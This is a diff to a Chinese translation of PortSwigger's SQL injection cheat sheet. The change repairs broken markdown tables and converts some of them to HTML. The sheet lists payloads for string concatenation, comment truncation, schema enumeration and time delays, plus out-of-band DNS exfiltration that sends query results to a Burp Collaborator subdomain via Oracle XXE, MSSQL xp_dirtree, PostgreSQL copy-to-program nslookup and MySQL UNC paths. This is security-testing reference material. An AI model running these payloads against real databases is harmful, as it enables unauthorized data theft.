@@ -10,12 +10,12 @@ description: '原文链接：https://portswigger.net/web-security/sql-injection/
 
 你可以将多个字符串连接在一起以组成一个字符串。
 
-| 数据库 | 语句 |  |  |
-| :--- | :--- | :--- | :--- |
-| **Oracle** | \`'foo' |  | 'bar'\` |
-| **Microsoft** | `'foo'+'bar'` |  |  |
-| **PostgreSQL** | \`'foo' |  | 'bar'\` |
-| **MySQL** | `'foo' 'bar'` \[注意两个字符串之间的空格\] `CONCAT('foo','bar')` |  |  |
+| 数据库 | 语句 |
+| :--- | :--- |
+| **Oracle** | `'foo' || 'bar'` |
+| **Microsoft** | `'foo'+'bar'` |
+| **PostgreSQL** | `'foo' || 'bar'` |
+| **MySQL** | `'foo' 'bar'` \[注意两个字符串之间的空格\] `CONCAT('foo','bar')` |
 
 ## 子字符串
 
@@ -32,12 +32,49 @@ description: '原文链接：https://portswigger.net/web-security/sql-injection/
 
 你可以使用注释来截断一个查询，并删除输入之后的原始查询部分。
 
-| 数据库 | 语句 |
-| :--- | :--- |
-| Oracle | `--comment` |
-| Microsoft | `--comment` `/*comment*/` |
-| PostgreSQL | `--comment` `/*comment*/` |
-| MySQL | `#comment` `-- comment` \[注意双破折号后面的空格\] `/*comment*/` |
+<table>
+  <thead>
+    <tr>
+      <th style="text-align:left">&#x6570;&#x636E;&#x5E93;</th>
+      <th style="text-align:left">&#x8BED;&#x53E5;</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align:left">Oracle</td>
+      <td style="text-align:left"><code>--comment</code>
+      </td>
+    </tr>
+    <tr>
+      <td style="text-align:left">Microsoft</td>
+      <td style="text-align:left">
+        <p><code>--comment</code> 
+        </p>
+        <p><code>/*comment*/</code>
+        </p>
+      </td>
+    </tr>
+    <tr>
+      <td style="text-align:left">PostgreSQL</td>
+      <td style="text-align:left">
+        <p><code>--comment</code> 
+        </p>
+        <p><code>/*comment*/</code>
+        </p>
+      </td>
+    </tr>
+    <tr>
+      <td style="text-align:left">MySQL</td>
+      <td style="text-align:left">
+        <p><code>#comment</code> 
+        </p>
+        <p><code>-- comment</code> [&#x6CE8;&#x610F;&#x53CC;&#x7834;&#x6298;&#x53F7;&#x540E;&#x9762;&#x7684;&#x7A7A;&#x683C;]</p>
+        <p><code>/*comment*/</code>
+        </p>
+      </td>
+    </tr>
+  </tbody>
+</table>
 
 ## 数据库版本
 
@@ -56,10 +93,10 @@ description: '原文链接：https://portswigger.net/web-security/sql-injection/
 
 | 数据库 | 语句 |
 | :--- | :--- |
-| Oracle | `SELECT * FROM all_tables`  `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
-| Microsoft | `SELECT * FROM information_schema.tables`  `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
-| PostgreSQL | `SELECT * FROM information_schema.tables`  `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
-| MySQL | `SELECT * FROM information_schema.tables`  `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| Oracle | `SELECT * FROM all_tables` `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| Microsoft | `SELECT * FROM information_schema.tables` `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| PostgreSQL | `SELECT * FROM information_schema.tables` `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| MySQL | `SELECT * FROM information_schema.tables` `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
 
 ## 条件错误
 
@@ -102,12 +139,12 @@ description: '原文链接：https://portswigger.net/web-security/sql-injection/
 
 你可以测试一个布尔条件，如果条件为真就会触发一个时间延迟。
 
-| 数据库 | 语句 |  |  |
-| :--- | :--- | :--- | :--- |
-| Oracle | \`SELECT CASE WHEN \(YOUR-CONDITION-HERE\) THEN 'a' |  | dbms\_pipe.receive\_message\(\('a'\),10\) ELSE NULL END FROM dual\` |
-| Microsoft | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |  |  |
-| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |  |  |
-| MySQL | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')` |  |  |
+| 数据库 | 语句 |
+| :--- | :--- |
+| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a' || dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
+| Microsoft | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
+| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
+| MySQL | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')` |
 
 ## DNS查询
 
@@ -124,12 +161,57 @@ description: '原文链接：https://portswigger.net/web-security/sql-injection/
 
 你可以使数据库对包含注入查询结果的外部域进行 DNS 查询。要做到这一点，你需要使用 [Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成一个你将在攻击中使用的唯一 Burp Collaborator 子域，然后轮询 Collaborator 服务器以检索任何 DNS 交互的细节，包括被渗出的数据。
 
-| 数据库 | 语句 |  |  |  |  |
-| :--- | :--- | :--- | :--- | :--- | :--- |
-| Oracle | \`SELECT extractvalue\(xmltype\('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root \[ &lt;!ENTITY % remote SYSTEM "http://' |  | \(SELECT YOUR-QUERY-HERE\) |  | '.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"&gt; %remote;\]&gt;'\),'/l'\) FROM dual\` |
-| Microsoft | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')` |  |  |  |  |
-| PostgreSQL | `create OR replace function f() returns void as $$` |  |  |  |  |
-
-`declare c text;` `declare p text;` `begin` `SELECT into p (SELECT YOUR-QUERY-HERE);` `c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';` `execute c;` `END;` `$$ language plpgsql security definer;` `SELECT f();` \| \| MySQL \| 以下技术仅在Windows系统中有效：  
- `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'` \|
+<table>
+  <thead>
+    <tr>
+      <th style="text-align:left">&#x6570;&#x636E;&#x5E93;</th>
+      <th style="text-align:left">&#x8BED;&#x53E5;</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align:left">Oracle</td>
+      <td style="text-align:left"><code>SELECT extractvalue(xmltype(&apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&apos;||(SELECT YOUR-QUERY-HERE)||&apos;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&quot;&gt; %remote;]&gt;&apos;),&apos;/l&apos;) FROM dual</code>
+      </td>
+    </tr>
+    <tr>
+      <td style="text-align:left">Microsoft</td>
+      <td style="text-align:left"><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&apos;master..xp_dirtree &quot;//&apos;+@p+&apos;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&quot;&apos;)</code>
+      </td>
+    </tr>
+    <tr>
+      <td style="text-align:left">PostgreSQL</td>
+      <td style="text-align:left">
+        <p><code>create OR replace function f() returns void as $$</code>
+        </p>
+        <p><code>declare c text;</code>
+        </p>
+        <p><code>declare p text;</code>
+        </p>
+        <p><code>begin</code>
+        </p>
+        <p><code>SELECT into p (SELECT YOUR-QUERY-HERE);</code>
+        </p>
+        <p><code>c := &apos;copy (SELECT &apos;&apos;&apos;&apos;) to program &apos;&apos;nslookup &apos;||p||&apos;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net&apos;&apos;&apos;;</code>
+        </p>
+        <p><code>execute c;</code>
+        </p>
+        <p><code>END;</code>
+        </p>
+        <p><code>$$ language plpgsql security definer;</code>
+        </p>
+        <p><code>SELECT f();</code>
+        </p>
+      </td>
+    </tr>
+    <tr>
+      <td style="text-align:left">MySQL</td>
+      <td style="text-align:left">
+        <p>&#x4EE5;&#x4E0B;&#x6280;&#x672F;&#x4EC5;&#x5728;Windows&#x7CFB;&#x7EDF;&#x4E2D;&#x6709;&#x6548;&#xFF1A;</p>
+        <p><code>SELECT YOUR-QUERY-HERE INTO OUTFILE &apos;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&apos; </code>
+        </p>
+      </td>
+    </tr>
+  </tbody>
+</table>
 
